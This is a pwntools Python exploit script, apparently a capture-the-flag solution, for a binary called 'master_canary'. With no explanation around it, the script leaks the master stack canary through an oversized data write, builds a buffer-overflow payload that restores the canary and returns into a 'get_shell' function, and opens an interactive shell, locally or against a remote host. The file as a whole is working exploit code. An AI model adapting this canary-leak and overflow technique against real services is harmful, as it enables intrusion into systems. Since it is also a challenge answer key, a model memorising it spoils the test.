#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('master_canary')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# 

gdbscript = '''
init-pwndbg
b *main+266
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def create_routine():
    io.sendlineafter(b">", b"1")


def write_data(size, data):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendlineafter(b"Data:", data)


def overflow(data):       
    io.sendlineafter(b">", b"3")
    io.sendafter(b"comment:", data)


def solve():
    offset_local = 169
    offset_remote = 2281

    create_routine()
    write_data(offset_remote, b"A"*offset_remote)
    io.recvuntil(b" Data: ")
    io.recvuntil(b"A"*offset_remote)
    canary = u64(io.recv(7).rjust(8, b"\x00"))
    info("canary: %#x", canary)

    offset = 40
    ret = 0x04007e1

    payload = flat({
        offset: [
            canary,
            b"A"*8,
            ret,
            exe.sym["get_shell"]
        ]
    })

    overflow(payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

